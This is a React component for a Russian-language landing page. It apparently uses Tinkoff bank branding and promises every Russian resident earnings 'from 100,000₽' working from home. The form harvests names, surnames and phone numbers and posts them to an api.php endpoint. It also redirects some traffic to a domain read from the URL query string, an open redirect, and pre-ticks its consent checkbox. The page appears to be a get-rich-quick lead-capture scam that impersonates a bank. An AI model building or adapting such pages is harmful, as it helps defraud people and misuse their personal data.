import React from "react";
import Image from "react-image-webp";
import { useForm, Controller } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import PhoneInput from "react-phone-input-2";
import axios from "axios";

import "react-phone-input-2/lib/style.css";
import "../assets/css/phone.css";

const schema = yup.object().shape({
  name: yup
    .string()
    .matches(/^([a-zA-Zа-яА-ЯёЁ\u10A0-\u10FF'\-]+)$/u, "Вводите только буквы")
    .max(10, "Слишком длинное имя")
    .min(2, "Слишком короткое имя")
    .required("Обязательное поле"),
  last: yup
    .string()
    .min(2, "Слишком короткая фамилия")
    .matches(/^([a-zA-Zа-яА-ЯёЁ\u10A0-\u10FF'\-]+)$/u, "Вводите только буквы")
    .max(15, "Слишком длинная фамилия")
    .required("Обязательное поле"),
  email: yup.string(),
  phone: yup
    .string()
    .matches(
      /^(\+7|7|8)?[\s\-]?\(?[489][0-9]{2}\)?[\s\-]?[0-9]{3}[\s\-]?[0-9]{2}[\s\-]?[0-9]{2}$/,
      "Введите корректный номер"
    )
    .required("Обязательное поле"),
  checkbox: yup.boolean().oneOf([true], "Поставьте галочку"),
});

const Form = () => {
  const [checkbox, setCheckbox] = React.useState(true);

  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
    control,
  } = useForm({
    mode: "onChange",
    resolver: yupResolver(schema),
  });
  const onSubmit = (data) => {
    axios({
      method: "post",
      url: "api.php",
      data,
      headers: { "Content-Type": "multipart/form-data" },
    })
      .then(function (response) {
        if (response.data.status) {
          let queryParams = new URLSearchParams(window.location.search);
          queryParams.get("trafficsource") === "Bigo"
            ? (window.location.href = `https://${queryParams.get(
                "domain"
              )}/thank-you.php?${queryParams}`)
            : (window.location.href = "success.php");
        }
      })
      .catch(function (response) {});
  };
  const watchName = watch("name");
  const watchLast = watch("last");
  const watchPhone = watch("phone");

  return (
    <>
      <div className="flex relative overflow-hidden">
        <Image
          className="absolute h-auto w-[106px] top-0 right-0 md:w-[133px]"
          src={require("../assets/img/flag.png")}
          webp={require("../assets/img/flag.webp")}
          alt=""
        />
        <Image
          className="absolute h-[455px] w-auto bottom-0 -left-1/3 md:left-0"
          src={require("../assets/img/tinkoff.png")}
          webp={require("../assets/img/tinkoff.webp")}
          alt=""
        />
        <Image
          className="absolute bottom-0 -right-1/2 md:right-0 md:h-[367px]"
          src={require("../assets/img/rus.png")}
          webp={require("../assets/img/rus.webp")}
          alt=""
        />
        <div className="relative z-20 flex flex-col justify-end py-9 px-5 min-h-screen h-full w-full">
          <Image
            className="w-[236px] h-[62px] mx-auto mb-4 md:absolute md:left-5 md:top-6"
            src={require("../assets/img/logo.png")}
            webp={require("../assets/img/logo.webp")}
            alt=""
          />
          <h1 className="font-bold text-xl text-center mb-4 uppercase md:text-2xl">
            ТЕПЕРЬ КАЖДЫЙ ЖИТЕЛЬ РОССИИ МОЖЕТ ПОЛУЧАТЬ С
            <span className="block text-primary font-black text-shadow">
              ТИНЬКОФФ OT 100 000₽
            </span>
          </h1>
          <h2 className="font-bold text-sm text-center mb-5 uppercase md:w-[420px] md:mx-auto md:text-base">
            ПРОЙДИТЕ ПРОСТУЮ РЕГИСТРАЦИЮ И УЗНАЙТЕ, КАК ЗАРАБАТЫВАТЬ ДЕНЬГИ, НЕ
            ВЫХОДЯ ИЗ ДОМА
          </h2>

          <form
            className="flex flex-col gap-4 bg-white/90 py-6 px-3 rounded md:w-[330px] md:mx-auto"
            onSubmit={handleSubmit(onSubmit)}
          >
            <h3 className="text-black font-bold text-xl text-center">
              Войти в личный кабинет и начать зарабатывать
            </h3>
            <div className="flex flex-col relative">
              <label
                className="font-medium text-sm mb-1 ml-4 text-black"
                htmlFor="name"
              >
                Введите имя
              </label>
              <input
                className={`
                ${errors?.name ? "!border-[red]" : "border-gray"}
                ${watchName && !errors?.name ? "!border-[green]" : ""} 
                outline-none bg-transparent py-[11px] px-[14px] border border-black rounded-full text-black focus:border-primary`}
                type="text"
                id="name"
                name="name"
                autoComplete="off"
                {...register("name")}
              />
              <p className="text-[red] absolute -bottom-4 ml-4 text-xs">
                {errors?.name?.message}
              </p>
            </div>
            <div className="flex flex-col relative">
              <label
                className="font-medium text-sm mb-1 ml-4 text-black"
                htmlFor="last"
              >
                Введите фамилию
              </label>
              <input
                className={`
                ${errors?.last ? "!border-[red]" : "border-gray"}
                ${watchLast && !errors?.last ? "!border-[green]" : ""} 
                outline-none bg-transparent py-[11px] px-[14px] border border-black rounded-full text-black focus:border-primary`}
                type="text"
                id="last"
                name="last"
                autoComplete="off"
                {...register("last")}
              />
              <p className="text-[red] absolute -bottom-4 ml-4 text-xs">
                {errors?.last?.message}
              </p>
            </div>
            <input
              type="hidden"
              id="email"
              name="email"
              autoComplete="off"
              {...register("email")}
              value={1}
            />
            <div className="flex flex-col relative">
              <label
                className="font-medium text-sm mb-1 ml-4 text-black"
                htmlFor="phone"
              >
                Введите телефон
              </label>
              <Controller
                name="phone"
                control={control}
                render={({ field: { onChange, value } }) => (
                  <PhoneInput
                    country={"ru"}
                    countryCodeEditable={false}
                    onlyCountries={["ru"]}
                    inputProps={{
                      name: "phone",
                      required: true,
                      autoComplete: "off",
                    }}
                    inputStyle={{
                      background: "transparent",
                      border: "none",
                      fontSize: "16px",
                      height: "auto",
                      width: "100%",
                      paddingLeft: "30px",
                    }}
                    dropdownStyle={{
                      background: "transparent",
                      display: "none",
                    }}
                    buttonStyle={{
                      border: "none",
                      background: "transparent",
                    }}
                    control={control}
                    value={value}
                    onChange={onChange}
                    id="phone"
                    rules={{ required: true }}
                    className={`
                ${errors?.phone ? "!border-[red]" : "border-gray"}
                ${watchPhone && !errors?.phone ? "!border-[green]" : ""} 
                outline-none bg-transparent py-[11px] px-[14px] border border-black rounded-full text-black focus:border-primary`}
                  />
                )}
              />
              <p className="text-[red] absolute -bottom-4 ml-4 text-xs">
                {errors?.phone?.message}
              </p>
            </div>
            <div className="flex items-center relative">
              <input
                className="w-4 h-4 accent-primary"
                type="checkbox"
                id="checkbox"
                name="checkbox"
                {...register("checkbox")}
                checked={checkbox}
                onClick={() => setCheckbox(!checkbox)}
              />
              <label
                className="text-sm ml-3 text-black mt-1"
                htmlFor="checkbox"
              >
                Я гражданин и налоговый резидент РФ
              </label>
              <p className="text-[red] absolute -bottom-4 ml-4 text-xs">
                {errors?.checkbox?.message}
              </p>
            </div>
            <button
              className={`${
                !isValid
                  ? "opacity-50"
                  : "opacity-100 animate-[btnPulse_1.5s_ease-in-out_infinite]"
              } btn-primary uppercase`}
              disabled={!isValid}
            >
              Отправить форму
            </button>
          </form>
        </div>
      </div>
    </>
  );
};

export default Form;
